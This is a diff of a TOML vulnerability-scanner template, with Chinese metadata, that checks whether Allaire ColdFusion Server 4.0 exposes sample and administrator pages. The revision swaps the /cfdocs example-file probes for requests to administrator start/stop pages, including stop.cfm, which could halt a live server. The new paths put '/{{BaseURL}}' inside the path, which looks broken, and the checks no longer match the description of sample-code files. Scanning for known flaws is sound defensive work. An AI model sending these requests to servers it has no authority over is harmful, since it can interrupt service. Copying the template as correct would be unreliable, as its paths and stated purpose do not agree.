@@ -1,8 +1,8 @@
 [info]
-author = "AVE"
-description = "检测 ColdFusion Server 4.0 是否暴露可运行示例代码文件，攻击者可利用这些文件读取服务器文件、发起拒绝服务或作为 HTTP 代理"
+author = "ave"
+description = "检测 ColdFusion Server 4.0 默认安装中是否存在可被远程访问的示例代码片段文件。这些示例文件（如 viewexample.cfm 等）未做访问控制，攻击者可利用其读取服务器文件、发起拒绝服务攻击或将服务器作为 HTTP 代理。"
 id = "POC-AVE-1999-0723"
-name = "Allaire ColdFusion Server 4.0 示例代码远程访问漏洞 PoC"
+name = "Allaire ColdFusion Server 4.0 示例代码片段文件读取与拒绝服务漏洞 PoC"
 severity = "high"
 tags = ["ave-1999-0723"]
 vuln_id = [
@@ -15,7 +15,7 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/cfdocs/viewexample.cfm"
+path = "/{{BaseURL}}/CFIDE/Administrator/startstop/startstop.cfm"
 protocol = "http"
 
 [[poc.requests.matchers]]
@@ -23,31 +23,24 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "ColdFusion",
-    "cfml",
-    "cfoutput",
-    "cfscript",
+    "Administrator",
+    "startstop",
 ]
 
 [[poc.requests]]
 method = "GET"
-path = "/cfdocs/exampleapp/"
+path = "/{{BaseURL}}/CFIDE/Administrator/startstop/stop.cfm"
 protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = [
-    "ColdFusion",
-    "cfml",
-    "cfoutput",
-    "cfscript",
-]
+words = ["stop"]
 
 [[poc.requests]]
 method = "GET"
-path = "/CFIDE/exampleapp/"
+path = "/{{BaseURL}}/CFIDE/samples/"
 protocol = "http"
 
 [[poc.requests.matchers]]
@@ -55,8 +48,7 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "ColdFusion",
-    "cfml",
-    "cfoutput",
-    "cfscript",
+    "Index of",
+    "Directory Listing",
+    "samples",
 ]
